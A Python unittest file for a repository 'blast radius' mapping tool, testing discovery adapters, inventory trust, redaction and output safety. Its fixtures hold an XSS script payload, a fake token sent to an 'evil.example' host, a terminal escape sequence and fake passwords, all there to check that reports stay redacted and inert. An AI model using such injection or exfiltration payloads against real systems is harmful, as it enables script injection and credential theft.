"""Discovery adapters (positive and negative fixtures), receipts, redaction
across every output, HTML injection safety, and determinism."""
import json
import os
import re
import shutil
import tempfile
import unittest

import _util
from _util import run_cli
import jh_map
import jh_explorer
import jh_views

# Fake credentials assembled from pieces so this file never looks like a leak.
PW = "hunter" + "2-NOT-REAL"
TOKEN = "ghp" + "_" + "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8"
XSS = "<scr" + "ipt>alert(1)</scr" + "ipt>"


def build(files, decl=None, inventory=None, trusted=False):
    col = jh_map.Collected(items=[jh_map.Item(k, v) for k, v in files.items()], considered=len(files))
    return jh_map.build_report(col, "/nonexistent", "app", "test", None, decl, inventory, trusted, "inv.json")


def labels(rep):
    return {n["display_label"] for n in rep["graph"]["nodes"]}


def edges_to(rep, needle):
    ids = {n["id"] for n in rep["graph"]["nodes"] if needle in n["display_label"]}
    return [e for e in rep["graph"]["edges"] if e["target"] in ids]


class Adapters(unittest.TestCase):
    def test_python_import_only_is_inferred_unresolved(self):
        rep = build({"app/db.py": "import psycopg\n"})
        es = edges_to(rep, "postgresql")
        self.assertEqual(len(es), 1)
        self.assertEqual((es[0]["verification"], es[0]["capability"], es[0]["confidence"]), ("inferred", "unknown", "low"))
        self.assertTrue(any("unresolved" in l for l in labels(rep)))

    def test_merge_into_needs_using(self):
        src = ('import psycopg\nconn = psycopg.connect("postgresql://pg.dev.internal/app")\n'
               'conn.execute("MERGE INTO accounts AS a USING staging s ON a.id = s.id")\n'
               'notes.append("merge into .claude/settings.json; a project file only pre-allows")\n')
        rep = build({"svc.py": src})
        writes = [e for e in rep["graph"]["edges"] if e["kind"] == "writes"]
        self.assertEqual(len(writes), 1)
        self.assertEqual([x["line"] for x in rep["evidence"] if x["id"] in writes[0]["evidence_refs"]], [3])

    def test_python_literal_endpoint_and_sql_ops(self):
        src = ('import psycopg\nconn = psycopg.connect("postgresql://u:%s@pg.prod.internal/ledger")\n'
               'conn.execute("DELETE FROM entries WHERE id = %%s")\nconn.execute("SELECT a FROM b")\n' % PW)  # jankhunt42: ignore JH104 (fixture text)
        rep = build({"svc.py": src})
        es = edges_to(rep, "pg.prod.internal")
        caps = {(e["kind"], e["capability"], e["verification"]) for e in es}
        self.assertIn(("deletes", "delete", "observed"), caps)
        self.assertIn(("reads", "read", "observed"), caps)
        self.assertIn(("connects", "unknown", "observed"), caps)
        for e in es:
            if e["kind"] == "deletes":
                self.assertTrue(any("does not prove" in a for a in e["assumptions"]))
        node = [n for n in rep["graph"]["nodes"] if "pg.prod.internal" in n["display_label"]][0]
        self.assertEqual(node["environment"], "production")
        ev = [x for x in rep["evidence"] if x["path"] == "svc.py" and x["line"] == 2][0]
        self.assertNotIn(PW, json.dumps(rep))
        self.assertTrue(ev["hash"])

    def test_sql_in_comment_is_ignored(self):
        rep = build({"svc.py": 'import psycopg\n# DELETE FROM entries\nx = 1\n'})
        self.assertFalse([e for e in rep["graph"]["edges"] if e["kind"] == "deletes"])

    def test_env_endpoint_resolution_and_dynamic_unknown(self):
        rep = build({".env.example": "DATABASE_URL=postgres://a:%s@db.internal:5432/app\n" % PW,
                     "a.py": 'import os\nimport psycopg\nDSN = os.environ["DATABASE_URL"]\nX = os.getenv("CACHE_URL")\n'})
        es = edges_to(rep, "db.internal")
        self.assertTrue(es)
        unk = [n for n in rep["graph"]["nodes"] if "CACHE_URL" in n["display_label"]]
        self.assertEqual(len(unk), 1)
        self.assertEqual(unk[0]["trust_domain"], "unknown")
        self.assertNotIn("hostname", json.dumps(unk))

    def test_http_call_methods(self):
        rep = build({"n.py": 'import requests\nrequests.post("https://api.vendor.example.com/v1/x?key=%s")\n'
                             'requests.get("https://api.vendor.example.com/v1/y")\n' % PW})
        caps = {e["capability"] for e in edges_to(rep, "api.vendor.example.com")}
        self.assertEqual(caps, {"read", "write"})
        self.assertNotIn(PW, json.dumps(rep))

    def test_js_and_dotnet(self):
        rep = build({"c.js": "const Redis = require('ioredis');\nconst r = new Redis(process.env.REDIS_URL);\n",
                     "Db.cs": 'var c = new SqlConnection(Configuration.GetConnectionString("Orders"));\n',
                     "appsettings.Production.json": json.dumps({"ConnectionStrings": {
                         "Orders": "Server=tcp:sql.example.net,1433;Database=orders;User ID=svc;Password=%s;" % PW}})})
        self.assertTrue(any(l.startswith("redis") for l in labels(rep)))
        orders = [n for n in rep["graph"]["nodes"] if "sql.example.net" in n["display_label"]]
        self.assertEqual(len(orders), 1)
        self.assertEqual(orders[0]["environment"], "production")
        self.assertNotIn(PW, json.dumps(rep))

    def test_kubernetes_secret_ref_is_reference_not_disclosure(self):
        y = ("apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: w\n  namespace: prod\nspec:\n  template:\n"
             "    spec:\n      serviceAccountName: w-sa\n      containers:\n        - name: c\n          env:\n"
             "            - name: DATABASE_URL\n              valueFrom:\n                secretKeyRef:\n"
             "                  name: db\n                  key: url\n")
        rep = build({"k8s/d.yaml": y})
        wl = [n for n in rep["graph"]["nodes"] if n["kind"] == "workload"][0]
        self.assertEqual(wl["attributes"]["credential_refs"], ["secret db:url"])
        self.assertEqual(wl["environment"], "production")
        self.assertTrue([n for n in rep["graph"]["nodes"] if n["kind"] == "identity"])

    def test_rbac_secret_read_and_wildcard_admin(self):
        y = ("kind: ClusterRole\napiVersion: rbac.authorization.k8s.io/v1\nmetadata:\n  name: god\nrules:\n"
             "  - apiGroups: [\"*\"]\n    resources: [\"*\"]\n    verbs: [\"*\"]\n---\n"
             "kind: ClusterRoleBinding\napiVersion: rbac.authorization.k8s.io/v1\nmetadata:\n  name: b\n"
             "subjects:\n  - kind: ServiceAccount\n    name: ci\n    namespace: tools\n"
             "roleRef:\n  kind: ClusterRole\n  name: god\n")
        rep = build({"rbac.yaml": y})
        caps = {(e["kind"], e["capability"]) for e in rep["graph"]["edges"]}
        self.assertIn(("administers", "admin"), caps)
        sec = [n for n in rep["graph"]["nodes"] if "secrets" in n["display_label"]][0]
        self.assertEqual(sec["sensitivity"], "restricted")

    def test_actions_permissions_and_missing_block(self):
        wf = ("on: push\npermissions:\n  contents: write\n  id-token: write\njobs:\n  d:\n    runs-on: x\n"
              "    environment: production\n    steps:\n      - uses: aws-actions/configure-aws-credentials@v4\n"
              "      - run: echo ${{ secrets.DEPLOY_KEY }}\n")
        rep = build({".github/workflows/d.yml": wf, ".github/workflows/e.yml": "on: push\njobs:\n  a:\n    runs-on: x\n"})
        wf_nodes = [n for n in rep["graph"]["nodes"] if n["display_label"] == "CI workflow d.yml"]
        self.assertEqual(wf_nodes[0]["attributes"]["credential_refs"], ["secret DEPLOY_KEY"])
        self.assertEqual(wf_nodes[0]["environment"], "production")
        kinds = {(e["kind"], e["capability"]) for e in rep["graph"]["edges"]}
        self.assertIn(("writes", "write"), kinds)
        self.assertTrue(any("permissions block" in a for e in rep["graph"]["edges"] for a in e["assumptions"]))

    def test_compose_service_dedup_with_url(self):
        dc = "services:\n  api:\n    environment:\n      REDIS_URL: redis://cache:6379\n    depends_on: [cache]\n  cache:\n    image: redis:7\n"
        rep = build({"docker-compose.yml": dc})
        redis = [n for n in rep["graph"]["nodes"] if n["kind"] == "database"]
        self.assertEqual(len(redis), 1)

    def test_terraform_admin_role(self):
        tf = 'resource "azurerm_role_assignment" "x" {\n  role_definition_name = "Owner"\n}\n'
        rep = build({"main.tf": tf})
        self.assertIn(("administers", "admin"), {(e["kind"], e["capability"]) for e in rep["graph"]["edges"]})

    def test_manifest_dependency_only_when_unseen(self):
        rep = build({"requirements.txt": "pymongo==4\n"})
        es = edges_to(rep, "mongodb")
        self.assertEqual(es[0]["verification"], "inferred")
        rep2 = build({"requirements.txt": "pymongo==4\n", "a.py": "import pymongo\n"})
        self.assertEqual(len(edges_to(rep2, "mongodb")), 1)

    def test_negatives_produce_nothing(self):
        rep = build({"README.md": "connect to postgres://u:p@h/db", "notes.txt": "requests.get('https://x.example')",
                     "tests/test_db.py": "import psycopg\npsycopg.connect('postgres://h/db')\n",
                     "a.py": "print('please select a file from the list')  # SELECT * FROM x\n"})
        self.assertEqual([n["kind"] for n in rep["graph"]["nodes"]], ["application"])
        self.assertEqual(rep["coverage"]["test_files_excluded"], 1)

    def test_malformed_yaml_is_partial_coverage_not_crash(self):
        rep = build({"bad.yaml": "a: [\n\tb: :\n"})
        self.assertEqual(rep["coverage"]["parse_failures"][0]["path"], "bad.yaml")
        rep = build({"k.yaml": "kind: Deployment\napiVersion: v1\nmetadata:\n\tname: x\n", "a.py": "import redis\n"})
        self.assertEqual(rep["coverage"]["status"], "partial")

    def test_no_supported_files_is_none_and_unknown(self):
        rep = build({"Main.hs": "main = pure ()\n"})
        self.assertEqual(rep["coverage"]["status"], "none")
        self.assertEqual(rep["assessment"]["exposure"]["class"], "Unknown")

    def test_receipts_have_path_line_hash(self):
        rep = build({"a.py": "import redis\n"})
        for ev in rep["evidence"]:
            self.assertTrue(ev["path"] and ev["hash"] and ev["line"] >= 1)
            self.assertIn(ev["state"], ("observed", "declared", "inferred", "provider-verified"))
        for e in rep["graph"]["edges"]:
            for k in ("id", "source", "target", "kind", "capability", "identity_ref", "verification",
                      "confidence", "source_trust", "evidence_refs", "assumptions"):
                self.assertIn(k, e)
        for n in rep["graph"]["nodes"]:
            for k in ("id", "kind", "display_label", "trust_domain", "criticality", "sensitivity", "evidence_refs"):
                self.assertIn(k, n)


class InventoryTrust(unittest.TestCase):
    INV = {"schema_version": "jankhunt.inventory.v1",
           "assets": [{"match": "pg.example", "sensitivity": "restricted", "criticality": "critical"}],
           "grants": [{"principal": "app", "target": "pg.example", "capability": "admin",
                       "verification": "provider-verified"}]}
    FILES = {"a.py": 'import psycopg\npsycopg.connect("postgresql://pg.example/x")\n'}

    def test_trusted_inventory_is_provider_verified(self):
        rep = build(self.FILES, inventory=self.INV, trusted=True)
        es = [e for e in edges_to(rep, "pg.example") if e["capability"] == "admin"]
        self.assertEqual(es[0]["verification"], "provider-verified")
        self.assertEqual(rep["assessment"]["exposure"]["class"], "Critical")

    def test_repo_inventory_never_verified(self):
        rep = build(self.FILES, inventory=self.INV, trusted=False)
        es = [e for e in edges_to(rep, "pg.example") if e["capability"] == "admin"]
        self.assertEqual(es[0]["verification"], "declared")
        self.assertNotEqual(rep["assessment"]["exposure"]["class"], "Critical")
        self.assertTrue(any("treated as declared" in w for w in rep["warnings"]))

    def test_repo_declaration_cannot_override_operator_classification(self):
        col = jh_map.Collected(items=[jh_map.Item(k, v) for k, v in self.FILES.items()])
        rep = jh_map.build_report(col, "/x", "app", "t", None, {"assets": [{"match": "pg.example", "sensitivity": "public"}]},
                                  self.INV, True, "inv.json")
        node = [n for n in rep["graph"]["nodes"] if "pg.example" in n["display_label"]][0]
        self.assertEqual(node["sensitivity"], "restricted")


class OutputSafety(unittest.TestCase):
    def hostile_report(self):
        files = {
            "x.py": ('import requests\nrequests.get("https://%s.evil.example/a?t=%s")\n' % ("q", TOKEN) +
                     'K = "postgres://root:%s@h.example/db"\n' % PW +
                     "requests.post(\"https://ok.example/%s\")\n" % XSS.replace(" ", "")),
            "k.yaml": ("kind: Deployment\napiVersion: apps/v1\nmetadata:\n  name: \"%s\"\n  namespace: n\n" % XSS.replace('"', "'")
                       + "spec:\n  template:\n    spec:\n      containers:\n        - name: c\n          env:\n"
                       + "            - name: API_URL\n              value: \"https://h\x1b[31m.example/%s\"\n" % PW),
        }
        return build(files)

    def test_no_secret_in_json_html_tty_markdown(self):
        rep = self.hostile_report()
        outputs = [json.dumps(rep), jh_explorer.render_map(rep), jh_map.markdown(rep),
                   jh_views.map_tty(rep, color=True), jh_views.map_tty(rep, color=False, ascii_only=True)]
        for i, out in enumerate(outputs):
            self.assertNotIn(PW, out, "output #%d leaks the password" % i)
            self.assertNotIn(TOKEN, out, "output #%d leaks the token" % i)

    def test_html_has_no_executable_injection(self):
        rep = self.hostile_report()
        html = jh_explorer.render_map(rep)
        self.assertNotIn("<script>alert", html)
        self.assertEqual(html.count("<script"), 2)  # data block + our code, nothing else
        self.assertIn("default-src 'none'", html)
        self.assertIsNone(re.search(r"""(src|href)\s*=\s*["']?(https?:|//)""", html))
        data = html.split('id="jh-data">', 1)[1].split("</script>", 1)[0]
        self.assertNotIn("<", data)
        self.assertNotIn("innerHTML", html)
        self.assertNotIn("eval(", html)

    def test_terminal_output_has_no_repo_escape_sequences(self):
        rep = self.hostile_report()
        plain = jh_views.map_tty(rep, color=False)
        self.assertNotIn("\x1b", plain)
        self.assertNotIn("\x1b[31m.example", jh_views.map_tty(rep, color=True))

    def test_determinism_and_order_independence(self):
        files = {"a.py": "import redis\nimport psycopg\n", "b.js": "require('pg')\n",
                 ".env": "DATABASE_URL=postgres://h.internal/db\n"}
        r1 = build(files)
        r2 = build(dict(reversed(list(files.items()))))
        for r in (r1, r2):
            r.pop("generated_at")
        self.assertEqual(json.dumps(r1, sort_keys=True), json.dumps(r2, sort_keys=True))


class CliMap(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="jh-map-")
        shutil.copytree(os.path.join(_util.FIXTURES, "demo-app"), os.path.join(self.tmp, "demo"))
        self.root = os.path.join(self.tmp, "demo")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_json_purity_and_byte_identical_runs(self):
        env = {"SOURCE_DATE_EPOCH": "1700000000"}
        a = run_cli("map", self.root, "--json", env=env)
        b = run_cli("map", self.root, "--json", env=env)
        self.assertEqual(a.returncode, 0, a.stderr)
        self.assertEqual(a.stdout, b.stdout)
        data = json.loads(a.stdout)
        self.assertEqual(data["schema_version"], "jankhunt.map.v1")
        self.assertEqual(data["scope"]["root"], ".")
        self.assertNotIn(self.tmp, a.stdout)

    def test_redirected_output_is_markdown_without_ansi(self):
        r = run_cli("map", self.root)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertTrue(r.stdout.startswith("# Blast radius map"))
        self.assertNotIn("\x1b", r.stdout)

    def test_redacted_share_mode(self):
        r = run_cli("map", self.root, "--json", "--redact")
        self.assertEqual(r.returncode, 0, r.stderr)
        for leak in ("ledger-db.prod.internal", "demo-reports-prod", "payments-api", "demo-app"):
            self.assertNotIn(leak, r.stdout)
        self.assertEqual(json.loads(r.stdout)["scope"]["redaction"], "share")

    def test_usage_errors(self):
        self.assertEqual(run_cli("map", self.root, "--json", "--html").returncode, 2)
        self.assertEqual(run_cli("map", os.path.join(self.tmp, "missing")).returncode, 2)
        r = run_cli("map", self.root, "--base", "HEAD")
        self.assertEqual(r.returncode, 2)
        self.assertIn("git", r.stderr)


if __name__ == "__main__":
    unittest.main()
